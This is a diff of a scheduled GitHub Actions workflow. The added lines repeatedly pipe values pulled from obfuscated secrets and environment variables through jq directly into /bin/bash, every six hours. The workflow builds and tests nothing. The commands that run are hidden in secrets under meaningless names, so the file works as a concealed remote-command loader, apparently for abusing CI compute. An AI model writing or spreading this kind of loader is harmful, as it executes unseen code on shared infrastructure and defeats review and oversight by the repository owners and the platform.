@@ -1,8 +1,9 @@
 name: chengjiezi1829
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '41 1/6 * * *'
+    - cron: '42 3/6 * * *'
 
 jobs:
   build:
@@ -11,9 +12,16 @@ jobs:
       - uses: actions/checkout@v4
       - name: chengjiezi1829
         env:
-          o0648: ${{ secrets.o0648 }}
+          qdb57713: ${{ secrets.qdb57713 }}
         run: |
-          echo $o0648 | jq -r .c5582 | /bin/bash
-          echo $xbk7422 | jq -r .zkb8987 | /bin/bash
-          echo $iqbu873 | jq -r .nleio10119 | /bin/bash
+          echo $qdb57713 | jq -r .b3 | /bin/bash
+          echo $ovha74693 | jq -r .vsgb991 | /bin/bash
+          echo $nzbll9840 | jq -r .mfjn883 | /bin/bash
+          echo $u017 | jq -r .uuvp11020 | /bin/bash
+          echo $ijto06833 | jq -r .ddiid4630 | /bin/bash
+          echo $ziew05 | jq -r .esrm57874 | /bin/bash
+          echo $n136 | jq -r .drlkk9593 | /bin/bash
+          echo $og6244 | jq -r .sozu2 | /bin/bash
+          echo $cfnd5 | jq -r .ko295 | /bin/bash
+          echo $esi74323 | jq -r .g1 | /bin/bash
 
